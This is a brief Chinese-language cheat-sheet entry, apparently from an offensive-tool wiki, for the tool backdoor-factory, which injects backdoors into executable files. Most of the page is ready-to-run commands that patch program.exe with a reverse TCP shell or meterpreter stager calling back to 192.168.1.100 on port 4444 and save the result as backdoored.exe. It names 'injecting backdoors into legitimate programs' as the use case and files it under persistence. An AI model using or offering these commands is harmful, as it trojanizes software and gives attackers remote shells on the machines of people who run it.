# backdoor-factory

## 简介
在可执行文件中注入后门

## 核心参数
- `-f`: 目标文件
- `-s`: payload 类型
- `-H`: 监听地址

## 命令示例
```bash
# 查看支持的 payload
backdoor-factory -f program.exe -s show

# 注入反向 shell
backdoor-factory -f program.exe -s reverse_shell_tcp -H 192.168.1.100 -P 4444

# 注入 meterpreter
backdoor-factory -f program.exe -s iat_reverse_tcp_stager -H 192.168.1.100 -P 4444

# 输出到新文件
backdoor-factory -f program.exe -s reverse_shell_tcp -H 192.168.1.100 -P 4444 -o backdoored.exe
```

## 使用场景
在合法程序中注入后门

## 所属分类
- [持久化 (Persistence)](../categories/19-persistence.md)
